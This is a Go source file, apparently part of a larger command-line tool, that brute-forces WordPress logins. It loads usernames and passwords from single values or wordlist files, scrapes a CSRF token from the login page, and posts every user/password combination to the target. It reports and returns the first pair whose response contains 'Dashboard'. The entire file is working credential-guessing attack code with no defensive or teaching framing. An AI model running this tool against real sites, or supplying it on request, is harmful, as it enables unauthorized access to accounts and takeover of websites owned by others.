package main
import (
    "fmt"
    "io/ioutil"
    "net/http"
    "net/http/cookiejar"
    "net/url"
    "strings"
    "bufio"
    "log"
    "os"
)
func (ArgVar *ArgVar)ListUserWordpress()([]string,[]string){
	
	var UserName []string
    var PassWords []string

    if ArgVar.User != "" {
        UserName = append(UserName, ArgVar.User)
    } else if ArgVar.UserList != "" {
        file, err := os.Open(ArgVar.UserList)
        if err != nil {
            log.Fatal(err)
        }
        defer file.Close()

        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            UserName = append(UserName, scanner.Text())
        }
        if err := scanner.Err(); err != nil {
            log.Fatal(err)
        }
    }

    if ArgVar.Pass != "" {
        PassWords = append(PassWords, ArgVar.Pass)
    } else if ArgVar.PassList != "" {
        file, err := os.Open(ArgVar.PassList)
        if err != nil {
            log.Fatal(err)
        }
        defer file.Close()

        scanner := bufio.NewScanner(file)
        for scanner.Scan() {
            PassWords = append(PassWords, scanner.Text())
        }
        if err := scanner.Err(); err != nil {
            log.Fatal(err)
        }
    }
    return UserName ,PassWords
 }   

func (ArgVar *ArgVar)WordpressLogin()(string,string){

    wordpressURL := ArgVar.URL
	jar, err := cookiejar.New(nil)
	if err != nil {
		fmt.Println("Error creating cookie jar:", err)
		return "",""
	}
	client := &http.Client{
		Jar: jar,
	}
	req, err := http.NewRequest("GET", wordpressURL, nil)
	if err != nil {
		fmt.Println("Error creating HTTP request:", err)
		return"",""
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)
		return "",""
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return "",""
	}
	csrfToken := ""
	bodyStr := string(body)
	csrfTokenField := `name="_csrf_token" value="`
	start := strings.Index(bodyStr, csrfTokenField)
	if start != -1 {
		start += len(csrfTokenField)
		end := strings.Index(bodyStr[start:], `"`)
		if end != -1 {
			csrfToken = bodyStr[start : start+end]
		}
	}
    if ArgVar.User !="" && ArgVar.Pass !=""{
     	data := url.Values{}
		data.Set("log", ArgVar.User)
		data.Set("pwd", ArgVar.Pass)
		data.Set("wp-submit", "Log In")
		data.Set("testcookie", "1")
		if csrfToken != "" {
			data.Set("_csrf_token", csrfToken)
		}
		req, err = http.NewRequest("POST", wordpressURL, strings.NewReader(data.Encode()))
		if err != nil {
			fmt.Println("Error creating HTTP request:", err)
			return "",""
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err = client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)
			return "",""
		}
		defer resp.Body.Close()
		body, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)
			return "",""
		}
		if strings.Contains(string(body), "Dashboard") {
			fmt.Println("Login successful")
			return ArgVar.User,ArgVar.Pass
		} else {
			fmt.Println("Login failed")
			fmt.Println("Response Status:", resp.Status)
			fmt.Println("Response Headers:", resp.Header)
		}		
	
    }else if ArgVar.User !="" && ArgVar.PassList !=""{
    	_ , Passlog :=ArgVar.ListUserWordpress()
	    	for index := range(Passlog){
	    		wordpressURL := ArgVar.URL
				jar, err := cookiejar.New(nil)
				if err != nil {
					fmt.Println("Error creating cookie jar:", err)
					return "",""
				}
				client := &http.Client{
					Jar: jar,
				}
				req, err := http.NewRequest("GET", wordpressURL, nil)
				if err != nil {
					fmt.Println("Error creating HTTP request:", err)
					return"",""
				}

				resp, err := client.Do(req)
				if err != nil {
					fmt.Println("Error sending request:", err)
					return "",""
				}
				defer resp.Body.Close()

				body, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Println("Error reading response body:", err)
					return "",""
				}
				csrfToken := "" 
				bodyStr := string(body)
				csrfTokenField := `name="_csrf_token" value="`
				start := strings.Index(bodyStr, csrfTokenField)
				if start != -1 {
					start += len(csrfTokenField)
					end := strings.Index(bodyStr[start:], `"`)
					if end != -1 {
						csrfToken = bodyStr[start : start+end]
					}
				}
	    		        fmt.Println(index)
		    	        data := url.Values{}
				data.Set("log", ArgVar.User)
				data.Set("pwd", Passlog[index])
				data.Set("wp-submit", "Log In")
				data.Set("testcookie", "1")
				if csrfToken != "" {
					data.Set("_csrf_token", csrfToken)
				}
				req, err = http.NewRequest("POST", wordpressURL, strings.NewReader(data.Encode()))
				if err != nil {
					fmt.Println("Error creating HTTP request:", err)
					return "",""
				}
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				resp, err = client.Do(req)
				if err != nil {
					fmt.Println("Error sending request:", err)
					return "",""
				}
				defer resp.Body.Close()
				body, err = ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Println("Error reading response body:", err)
					return "",""
				}
				if strings.Contains(string(body), "Dashboard") {
					fmt.Println("Login successful")
					return ArgVar.User,Passlog[index]
				} else {
					fmt.Println("Login failed")
					fmt.Println("Response Status:", resp.Status)
					fmt.Println("Response Headers:", resp.Header)
				}		  
        }
    }else if ArgVar.Pass !="" && ArgVar.UserList !=""{
    	 UserLog, _ :=ArgVar.ListUserWordpress()
	    	for index := range(UserLog){
	    		wordpressURL := ArgVar.URL
				jar, err := cookiejar.New(nil)
				if err != nil {
					fmt.Println("Error creating cookie jar:", err)
					return "",""
				}
				client := &http.Client{
					Jar: jar,
				}
				req, err := http.NewRequest("GET", wordpressURL, nil)
				if err != nil {
					fmt.Println("Error creating HTTP request:", err)
					return"",""
				}

				resp, err := client.Do(req)
				if err != nil {
					fmt.Println("Error sending request:", err)
					return "",""
				}
				defer resp.Body.Close()

				body, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Println("Error reading response body:", err)
					return "",""
				}
				csrfToken := "" 
				bodyStr := string(body)
				csrfTokenField := `name="_csrf_token" value="`
				start := strings.Index(bodyStr, csrfTokenField)
				if start != -1 {
					start += len(csrfTokenField)
					end := strings.Index(bodyStr[start:], `"`)
					if end != -1 {
						csrfToken = bodyStr[start : start+end]
					}
				}
	    		        fmt.Println(index)
		    	        data := url.Values{}
				data.Set("log", UserLog[index])
				data.Set("pwd", ArgVar.Pass)
				data.Set("wp-submit", "Log In")
				data.Set("testcookie", "1")
				if csrfToken != "" {
					data.Set("_csrf_token", csrfToken)
				}
				req, err = http.NewRequest("POST", wordpressURL, strings.NewReader(data.Encode()))
				if err != nil {
					fmt.Println("Error creating HTTP request:", err)
					return "",""
				}
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				resp, err = client.Do(req)
				if err != nil {
					fmt.Println("Error sending request:", err)
					return "",""
				}
				defer resp.Body.Close()
				body, err = ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Println("Error reading response body:", err)
					return "",""
				}
				if strings.Contains(string(body), "Dashboard") {
					fmt.Println("Login successful")
					return UserLog[index],ArgVar.Pass
				} else {
					fmt.Println("Login failed")
					fmt.Println("Response Status:", resp.Status)
					fmt.Println("Response Headers:", resp.Header)
				}		  
               }
    }else if ArgVar.UserList != "" && ArgVar.PassList !=""{
    	UserList , PassList := ArgVar.ListUserWordpress()
    	for IndexU := range UserList {
    		for IndexP := range PassList{
    			wordpressURL := ArgVar.URL
				jar, err := cookiejar.New(nil)
				if err != nil {
					fmt.Println("Error creating cookie jar:", err)
					return "",""
				}
				client := &http.Client{
					Jar: jar,
				}
				req, err := http.NewRequest("GET", wordpressURL, nil)
				if err != nil {
					fmt.Println("Error creating HTTP request:", err)
					return"",""
				}

				resp, err := client.Do(req)
				if err != nil {
					fmt.Println("Error sending request:", err)
					return "",""
				}
				defer resp.Body.Close()

				body, err := ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Println("Error reading response body:", err)
					return "",""
				}
				csrfToken := "" 
				bodyStr := string(body)
				csrfTokenField := `name="_csrf_token" value="`
				start := strings.Index(bodyStr, csrfTokenField)
				if start != -1 {
					start += len(csrfTokenField)
					end := strings.Index(bodyStr[start:], `"`)
					if end != -1 {
						csrfToken = bodyStr[start : start+end]
					}
				}
	    		        fmt.Println("")
		        	data := url.Values{}
				data.Set("log", UserList[IndexU] )
				data.Set("pwd", PassList[IndexP])
				data.Set("wp-submit", "Log In")
				data.Set("testcookie", "1")
				if csrfToken != "" {
					data.Set("_csrf_token", csrfToken)
				}
				req, err = http.NewRequest("POST", wordpressURL, strings.NewReader(data.Encode()))
				if err != nil {
					fmt.Println("Error creating HTTP request:", err)
					return "",""
				}
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				resp, err = client.Do(req)
				if err != nil {
					fmt.Println("Error sending request:", err)
					return "",""
				}
				defer resp.Body.Close()
				body, err = ioutil.ReadAll(resp.Body)
				if err != nil {
					fmt.Println("Error reading response body:", err)
					return "",""
				}
				if strings.Contains(string(body), "Dashboard") {
					fmt.Println("Login successful")
					return UserList[IndexU] ,PassList[IndexP]
				} else {
					fmt.Println("Login failed")
					fmt.Println("Response Status:", resp.Status)
					fmt.Println("Response Headers:", resp.Header)
				}
			}			  
              }
    }
    return "",""
}
